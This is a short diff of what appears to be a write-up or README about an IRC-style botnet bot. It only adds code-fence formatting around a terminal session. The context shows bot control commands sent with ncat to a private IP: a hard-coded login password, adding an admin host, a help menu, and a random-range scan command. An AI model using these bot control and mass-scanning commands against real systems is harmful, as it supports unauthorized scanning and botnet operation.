@@ -244,7 +244,7 @@ for sending glob command to the bots
 root@lamer:~# echo '!logmein hur3hur3' | ncat 10.0.0.103 31337
 root@lamer:~# echo '!addadm 10.0.0.254' | ncat 10.0.0.103 31337
 My Master > 10.0.0.254 
-
+```Shell
 root@lamer:~#  echo '!help' | ncat 10.0.0.103 31337
                ____          _____
               |  _ \        (_   _)
@@ -279,6 +279,7 @@ root@lamer:~#  echo '!help' | ncat 10.0.0.103 31337
 --------------------------------KNOW BUGS--------------------------------
 << NONE
 root@lamer:~#
+```
 we can see the bot has some features lemme start with the !rndscan command
 
 !rndscan 192.*.*.* <THREADS> <MINUTES>
